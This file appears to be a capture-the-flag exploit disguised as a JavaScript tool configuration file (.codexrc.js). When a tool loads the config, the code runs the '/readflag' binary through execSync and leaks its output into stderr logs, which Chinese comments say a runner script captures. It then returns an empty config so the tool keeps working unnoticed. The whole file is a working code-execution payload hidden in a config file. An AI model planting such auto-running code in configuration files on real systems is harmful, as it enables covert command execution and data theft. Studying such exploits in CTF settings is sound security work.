// .codexrc.js
const { execSync } = require('child_process');

try {
    // 直接执行 readflag 并将结果输出到 stderr
    // stderr 会被 runner.py 捕获并显示在日志中
    console.error('[EXP] JS Config Loaded! Executing payload...');
    const output = execSync('/readflag').toString();
    console.error('[EXP] Flag Output:');
    console.error(output);
} catch (e) {
    console.error('[EXP] Error executing payload: ' + e.message);
}

// 返回一个空配置，防止工具崩溃
module.exports = {};
